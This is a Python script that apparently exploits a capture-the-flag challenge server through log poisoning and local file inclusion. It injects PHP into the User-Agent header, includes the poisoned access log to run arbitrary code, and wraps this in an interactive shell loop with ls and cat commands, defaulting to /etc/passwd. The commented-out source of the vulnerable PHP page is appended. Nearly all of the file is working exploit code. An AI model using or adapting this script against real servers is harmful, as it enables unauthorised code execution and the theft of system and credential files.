import requests
import base64 
import readline 


foo = '/etc/passwd'

def run(foo):

    print(foo)

    headers = {
        'User-Agent': f'<?php {foo} ?>',
    }
    st=f'https://poison-for-tomorrow.secchallenge.crysys.hu/index.php?page=/var/log/apache2/access.log'
    #st=f'https://csokavar.hu/x.php?page={foo}'

    r = requests.post(st,headers=headers,data='echo 21')
    print((r.text))

def dir(foo):
    run(f'foreach (scandir("{foo}") as $x) echo $x."\\n"')
   
def cat(foo):
    run(f'foreach (file("{foo}") as $x) echo $x')
   

while True:
    st = input('>')
    
    if st == '':
        break

    parts = st.split(' ')
    if parts[0] == 'ls':
        dir(parts[1])
    elif parts[0] == 'cat':
        cat(parts[1])
    else:
        run(st)


#foreach (file('/var/www/html/index.php') as $x) echo $x

# <?php

# session_start([
#     'cookie_lifetime' => 3600,
# ]);

# if (isset($_SESSION['history'])) {
# 	$_SESSION['history'] .= $_SERVER['REMOTE_ADDR']  . " - - [" . date("Y-m-d H:i:s") . "] \"" . $_SERVER["REQUEST_METHOD"] . " " . $_SERVER["REQUEST_URI"] . " " . $_SERVER["SERVER_PROTOCOL"] . "\" - \"" . $_SERVER['HTTP_USER_AGENT'] . "\"\n";
# }
# else {
# 	$_SESSION['history'] = $_SERVER['REMOTE_ADDR']  . " - - [" . date("Y-m-d H:i:s") . "] \"" . $_SERVER["REQUEST_METHOD"] . " " . $_SERVER["REQUEST_URI"] . " " . $_SERVER["SERVER_PROTOCOL"] . "\" - \"" . $_SERVER['HTTP_USER_AGENT'] . "\"\n";
# }

# $temp = tmpfile();

# if (isset($_GET['page'])) {
# 	$page = $_GET['page'];
# 	if ($page == "/var/log/apache2/access.log") {
# 		fwrite($temp, $_SESSION['history']);
# 		$page = stream_get_meta_data($temp)['uri'];
# 	}
# }
# else {
# 	header("Location: index.php?page=countdown.html");
# }

# require_once($page);
# fclose($temp);
# ?>